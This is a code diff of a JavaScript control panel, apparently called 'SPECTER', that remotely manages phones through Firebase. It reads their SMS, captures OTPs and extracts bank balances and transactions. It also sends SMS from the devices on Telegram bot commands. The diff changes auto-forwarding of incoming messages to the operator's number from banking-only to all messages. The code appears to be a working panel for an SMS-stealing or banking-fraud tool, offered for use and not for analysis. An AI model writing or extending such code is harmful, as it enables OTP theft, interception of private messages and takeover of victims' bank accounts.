+    bAll.style.borderColor=mode==='all'?'rgba(168,85,247,.4)':'var(--border)';
+    bAll.style.color=mode==='all'?'var(--gold2)':'var(--sub)';
+  }
+  if(bBank){
+    bBank.style.background=mode==='banking'?'rgba(168,85,247,.16)':'var(--bg3)';
+    bBank.style.borderColor=mode==='banking'?'rgba(168,85,247,.4)':'var(--border)';
+    bBank.style.color=mode==='banking'?'var(--gold2)':'var(--sub)';
+  }
+  if(hint)hint.textContent=mode==='banking'?'Only bank/OTP/transaction messages will be forwarded':'All incoming messages will be forwarded';
 }
 function updateTgStatusLine(){
   var el=document.getElementById('tgStatusLine');if(!el)return;
@@ -821,7 +851,6 @@ function updateTgStatusLine(){
     lines.push('● Running — monitoring '+(userConfig.channelId||'—'));
     lines.push('📊 Updates received: '+tgDiagnostics.updateCount+' (last: '+ago+')');
     if(tgDiagnostics.botInfo)lines.push('🤖 Bot: @'+tgDiagnostics.botInfo.username+' ('+tgDiagnostics.botInfo.id+')');
-    if(tgDiagnostics.webhookInfo&&tgDiagnostics.webhookInfo!=='(none)')lines.push('⚠ Webhook was: '+tgDiagnostics.webhookInfo);
     if(tgDiagnostics.lastError)lines.push('⚠ '+tgDiagnostics.lastError);
     el.className='settings-status '+(tgDiagnostics.lastError?'err':'on');
   } else {
@@ -940,7 +969,6 @@ function loadFirebasesFromConfig(){
     renderFbList();
   })();
 }
-
 function saveAllSettings(){
   userConfig.myNumber=document.getElementById('setMyNumber').value.trim();
   userConfig.userId=document.getElementById('setTgUserId').value.trim();
@@ -950,10 +978,11 @@ function saveAllSettings(){
   cacheConfigLocal();debouncedCloudSave();
   if(userConfig.botEnabled&&userConfig.channelId){startTelegramBot();}else{stopTelegramBot();}
   updateTgStatusLine();
-  toast('💾 Settings saved'+(blobId?' to cloud':''));
+  toast('💾 Saved · My: '+(userConfig.myNumber||'—')+' · Mode: '+(userConfig.forwardMode||'all'));
+  console.log('[Settings] Saved:',JSON.stringify({myNumber:userConfig.myNumber,channelId:userConfig.channelId,forwardEnabled:userConfig.forwardEnabled,forwardMode:userConfig.forwardMode}));
 }
 
-/* ═══════════ TELEGRAM BOT v4 ═══════════ */
+/* ═══════════ TELEGRAM BOT ═══════════ */
 async function fetchBotUsername(){
   try{
     var r=await fetch(CFG.TG_API+'/getMe',{signal:AbortSignal.timeout(6000)});
@@ -966,7 +995,7 @@ async function startTelegramBot(){
   stopTelegramBot();
   if(!userConfig.channelId){toast('⚠ Set channel ID first');return;}
   tgDiagnostics.lastError='';updateTgStatusLine();
-  try{var r=await fetch(CFG.TG_API+'/deleteWebhook?drop_pending_updates=false',{signal:AbortSignal.timeout(6000)});var d=await r.json();if(!d.ok){tgDiagnostics.lastError='deleteWebhook: '+(d.description||'failed');updateTgStatusLine();}}catch(e){tgDiagnostics.lastError='deleteWebhook err: '+e.message;updateTgStatusLine();}
+  try{var r=await fetch(CFG.TG_API+'/deleteWebhook?drop_pending_updates=false',{signal:AbortSignal.timeout(6000)});var d=await r.json();if(!d.ok){tgDiagnostics.lastError='deleteWebhook: '+(d.description||'failed');updateTgStatusLine();}}catch(e){}
   try{
     var r2=await fetch(CFG.TG_API+'/getMe',{signal:AbortSignal.timeout(6000)});var d2=await r2.json();
     if(!d2.ok){tgDiagnostics.lastError='Bot token invalid: '+(d2.description||'unknown');toast('❌ Bot token invalid');updateTgStatusLine();return;}
@@ -1015,27 +1044,21 @@ async function telegramPollOnce(){
     var chatUser=String(msg.chat&&msg.chat.username||'');
     var cfgCh=String(userConfig.channelId||'');
     var cfgChClean=cfgCh.replace('@','');
-    console.log('[TG] update_id='+u.update_id,'chat.id='+chatId,'chat.user=@'+chatUser,'config='+cfgCh);
     var match=false;
     if(!cfgCh)match=false;
     else if(cfgCh.startsWith('@')){match=(chatUser.toLowerCase()===cfgChClean.toLowerCase());}
-    else{
-      var cfgNum=cfgCh.replace(/[^\-\d]/g,'');
-      match=(chatId===cfgNum)||(chatId===cfgCh);
-      if(!match&&cfgNum.length>6&&chatId.length>6){match=chatId.endsWith(cfgNum.slice(-9))||cfgNum.endsWith(chatId.slice(-9));}
-    }
-    if(!match){tgDiagnostics.lastError='Channel mismatch: got '+chatId+' expected '+cfgCh;updateTgStatusLine();continue;}
+    else{var cfgNum=cfgCh.replace(/[^\-\d]/g,'');match=(chatId===cfgNum)||(chatId===cfgCh);if(!match&&cfgNum.length>6&&chatId.length>6){match=chatId.endsWith(cfgNum.slice(-9))||cfgNum.endsWith(chatId.slice(-9));}}
+    if(!match){console.log('[TG] Skipped — channel mismatch. Got '+chatId+' expected '+cfgCh);continue;}
     var text=msg.text||msg.caption||'';
     if(!text)continue;
     var parsed=parseTelegramMessage(text);
     if(!parsed.valid){toast('🤖 Msg received but no number/message detected');continue;}
+    console.log('[TG] Match! Sending SMS to '+parsed.number);
     await handleTelegramSms(parsed.number,parsed.message,msg);
   }
   updateTgStatusLine();
   return false;
 }
-
-/* ═══════════ SMART MULTI-FORMAT PARSER ═══════════ */
 function parseTelegramMessage(text){
   text=String(text||'');
   var number=null,message=null;
@@ -1078,85 +1101,89 @@ function parseTelegramMessage(text){
   if(number&&number.length<10)number=null;
   return{number:number,message:message,valid:!!(number&&message)};
 }
-
-/* ═══════════ SEND SMS VIA ACTIVE DEVICE (Telegram) ═══════════ */
 async function handleTelegramSms(number,message,msgObj){
   var dev=null;
   if(activeDeviceUid){var parts=activeDeviceUid.split('|||');dev=allDevices.find(function(x){return x.id===parts[1]&&(x._fbId||'primary')===parts[0];});}
   if(!dev)dev=selDev||allDevices.find(function(d){return d.status;});
-  if(!dev){toast('⚠ No device for telegram SMS');return;}
+  if(!dev){toast('⚠ No device for telegram SMS');console.error('[TG] No device');return;}
   var sim=deviceSimMap[dev.id]||1;
-  try{
-    await fbSet('clients/'+dev.id+'/webhookEvent/sendSms',{from:sim,to:number,message:message,isSended:false},dev._fbUrl,dev._fbKey);
-    toast('🤖 SMS → '+number+' via '+dev.name+' (SIM '+sim+')');
-  }catch(e){toast('🤖 SMS failed: '+e.message);}
+  var res=await sendSmsViaDevice(dev,sim,number,message,'tg');
+  if(res.ok)toast('🤖 SMS → '+number+' via '+dev.name+' (SIM '+sim+')');
+  else toast('🤖 Failed: '+res.error);
 }
 
-/* ═══════════ AUTO-FORWARD v2 — Banking SMS only ═══════════ */
+/* ═══════════════════════════════════════════════════════════
+   AUTO-FORWARD v5 — Always-set baseline + logging
+   ═══════════════════════════════════════════════════════════ */
 async function checkAndForward(msgs,deviceId){
-  if(userConfig.forwardEnabled===false)return;
-  var myNum=userConfig.myNumber;
-  if(!myNum)return;
   if(!msgs||!msgs.length)return;
   var dev=allDevices.find(function(d){return d.id===deviceId;});
-  if(!dev)return;
+  if(!dev){return;}
 
   var lastForwarded=forwardTracker[deviceId]||'';
 
-  // First time: set baseline, DON'T forward old msgs
+  // ALWAYS set baseline first time
   if(!lastForwarded){
     forwardTracker[deviceId]=msgs[0].key;
     saveForwardTracker();
-    console.log('[FWD] Baseline set for '+deviceId+' at key '+msgs[0].key);
+    console.log('[FWD] Baseline set for '+dev.name+' ('+deviceId+') at key '+msgs[0].key);
     return;
   }
 
-  // Collect only new messages arriving after baseline
-  var toForward=[];
-  for(var i=0;i<msgs.length;i++){
-    var m=msgs[i];
-    if(m.key===lastForwarded)break;      // hit baseline — stop
-    if(m.type!=='incoming')continue;      // only incoming
-    if(!m.message||!m.message.trim())continue;
-    if(m.message.trim()==='(no body)')continue;
-    // ── BANKING-ONLY FILTER ──
-    var bank=isBankingSms(m.sender,m.message);
-    if(!bank){
-      console.log('[FWD] Skipped (not banking): '+m.sender+' → '+String(m.message).slice(0,40));
-      continue;
-    }
-    m._bank=bank;
-    toForward.push(m);
+  // Check if forwarding enabled
+  if(userConfig.forwardEnabled===false){
+    if(msgs[0].key!==lastForwarded){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();}
+    return;
   }
-
-  // If nothing new to forward, still update tracker
-  if(!toForward.length){
+  var myNum=userConfig.myNumber;
+  if(!myNum){
     if(msgs[0].key!==lastForwarded){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();}
     return;
   }
 
-  // Update tracker BEFORE sending (prevent duplicate forwards)
+  var forwardMode = userConfig.forwardMode || 'all';
+  var toForward=[];
+  var skipped=0;
+
+  for(var i=0;i<msgs.length;i++){
+    var m=msgs[i];
+    if(m.key===lastForwarded)break;
+    if(m.type!=='incoming')continue;
+    if(!m.message||!m.message.trim())continue;
+    if(m.message.trim()==='(no body)')continue;
+
+    if(forwardMode==='banking'){
+      var bank=isBankingSms(m.sender,m.message);
+      if(!bank){skipped++;continue;}
+      m._bank=bank;
+    }
+    toForward.push(m);
+  }
+
+  if(!toForward.length){
+    if(msgs[0].key!==lastForwarded){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();}
+    if(skipped>0)console.log('[FWD] '+skipped+' new msgs skipped (not banking)');
+    return;
+  }
+
+  // Update baseline BEFORE sending
   forwardTracker[deviceId]=msgs[0].key;
   saveForwardTracker();
 
   var sim=deviceSimMap[dev.id]||1;
   var ok=0,fail=0;
+  console.log('[FWD] Forwarding '+toForward.length+' new msg(s) from '+dev.name+' → '+myNum);
 
-  // Send OLDEST first (toForward is newest-first)
+  // Send OLDEST first
   for(var j=toForward.length-1;j>=0;j--){
     var msg=toForward[j];
-    // ONLY raw message — no prefix
     var forwardText=String(msg.message||'').trim();
     if(!forwardText)continue;
-    try{
-      await fbSet('clients/'+dev.id+'/webhookEvent/sendSms',
-        {from:sim,to:myNum,message:forwardText,isSended:false},
-        dev._fbUrl,dev._fbKey);
-      ok++;
-      console.log('[FWD] Sent from '+msg._bank.name+': '+forwardText.slice(0,40));
-    }catch(e){fail++;}
+    var res=await sendSmsViaDevice(dev,sim,myNum,forwardText,'fwd');
+    if(res.ok)ok++;else fail++;
   }
-  if(ok>0)toast('🏦 Forwarded '+ok+' banking msg'+(ok>1?'s':'')+' → '+myNum);
+  if(ok>0)toast('📤 Forwarded '+ok+' msg'+(ok>1?'s':'')+' → '+myNum);
+  if(fail>0)toast('⚠ '+fail+' forward(s) failed');
 }
 
 /* ═══════════ PING ═══════════ */
@@ -1231,21 +1258,18 @@ function otpShow(otp,src){_lastOtp=otp;document.getElementById('otpNum').textCon
 function otpCopy(){var v=document.getElementById('otpNum').textContent;if(!v||v.includes('─'))return;navigator.clipboard&&navigator.clipboard.writeText(v).then(function(){toast('✓ OTP copied');});}
 function otpDismiss(){document.getElementById('otpBar').classList.remove('show');}
 
-/* ═══════════ BANK BAR (Balance Display) — uses BANK_SENDERS ═══════════ */
+/* ═══════════ BANK BAR ═══════════ */
 function renderBankBar(){
   var out=document.getElementById('bankBar');
   if(!out)return;
   var msgs=allMsgs||[];
   if(!msgs.length){out.innerHTML='';return;}
   var fmt=function(n){return'\u20B9'+Number(n).toLocaleString('en-IN',{maximumFractionDigits:2});};
-
   var banks={};
   var sorted=msgs.slice().sort(function(a,b){return a.dateTime<b.dateTime?-1:1;});
   sorted.forEach(function(m){
     var txt=m.message||'',sender=m.sender||'';
-    // Skip promos / non-banking
-    var bank=detectBank(sender);
-    if(!bank)return;
+    var bank=detectBank(sender);if(!bank)return;
     var lower=txt.toLowerCase();
     var isPromo=false;
     for(var p=0;p<BANK_PROMO_KEYWORDS.length;p++){if(lower.indexOf(BANK_PROMO_KEYWORDS[p])!==-1){isPromo=true;break;}}
@@ -1254,26 +1278,18 @@ function renderBankBar(){
     if(!hasTxnOrBal){for(var b=0;b<BANK_BAL_KEYWORDS.length;b++){if(lower.indexOf(BANK_BAL_KEYWORDS[b])!==-1){hasTxnOrBal=true;break;}}}
     if(!hasTxnOrBal)return;
     if(isPromo&&!hasTxnOrBal)return;
-
-    // Account number
     var acctM=txt.match(/[Aa]\/?[Cc]\.?\s*(?:[Nn][Oo]\.?)?\s*([NX*0-9]{4,})/);
     var acct=acctM?acctM[1].replace(/[NX*]/g,'').slice(-4):'';
     var key=bank.name+(acct?'-'+acct:'');
-
-    // Amounts
     var re=/(?:Rs\.?\s*|INR\.?\s*|\u20B9\s*)([0-9,]+(?:\.[0-9]{1,2})?)/gi,match,amts=[];
     while((match=re.exec(txt))!==null){var v=parseFloat(match[1].replace(/,/g,''));if(!isNaN(v)&&v>0)amts.push(v);}
     if(!amts.length)return;
-
     var isCr=/credited|credit\b|received|deposited|refund/i.test(txt)&&!/debit/i.test(txt);
     var isDr=/debited|debit\b|spent|withdrawn/i.test(txt)&&!/credit/i.test(txt)||/\bDr\b/.test(txt);
     if(!isCr&&!isDr)return;
-
     if(!banks[key])banks[key]={name:bank.name,acct:acct?'\u2022\u2022'+acct:'',cr:0,dr:0,bal:null};
     var b=banks[key];
     if(isCr)b.cr+=amts[0];else b.dr+=amts[0];
-
-    // Balance extraction — expanded patterns
     var bp=[
       /(?:Avl\.?\s*Bal|AvlBal|Available\s*Bal|Avail\.?\s*Bal|Avbl\s*Bal)\s*:?\s*(?:Rs\.?:?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,
       /(?:Ledger|Book|Closing)\s*Bal(?:ance)?\s*:?\s*(?:Rs\.?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,
@@ -1286,7 +1302,6 @@ function renderBankBar(){
     ];
     for(var p2=0;p2<bp.length;p2++){var bm=txt.match(bp[p2]);if(bm){var bv=parseFloat(bm[1].replace(/,/g,''));if(!isNaN(bv)){b.bal=bv;break;}}}
   });
-
   var list=Object.values(banks);
   if(!list.length){out.innerHTML='';return;}
   list.sort(function(a,b){return(b.cr+b.dr)-(a.cr+a.dr);});
@@ -1308,9 +1323,10 @@ function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'
 function clip(t,btn){if(navigator.clipboard){navigator.clipboard.writeText(t).then(function(){if(btn){btn.textContent='✓';setTimeout(function(){btn.textContent='Copy';},1500);}});}}
 function catClick(){toast('😸 Meow!');}
 function rippleClick(e){var btn=e.currentTarget;var r=document.createElement('span');r.className='rip';var rect=btn.getBoundingClientRect();r.style.left=(e.clientX-rect.left-45)+'px';r.style.top=(e.clientY-rect.top-45)+'px';btn.appendChild(r);setTimeout(function(){r.remove();},750);}
-
 document.addEventListener('keydown',function(e){if(e.key==='Escape')document.querySelectorAll('.overlay.open').forEach(function(o){o.classList.remove('open');});if(e.key==='Enter'&&document.getElementById('setup').style.display!=='none')connect();});
 
 try{activeDeviceUid=localStorage.getItem(CFG.LS_ACTIVE||'specter_active_device');}catch(e){}
 setTimeout(function(){updateTgBtn();},1000);
 setInterval(function(){if(document.getElementById('settingsModal')&&document.getElementById('settingsModal').classList.contains('open')){updateTgStatusLine();}},3000);
+
+console.log('[SPECTER] Loaded. Ready.');
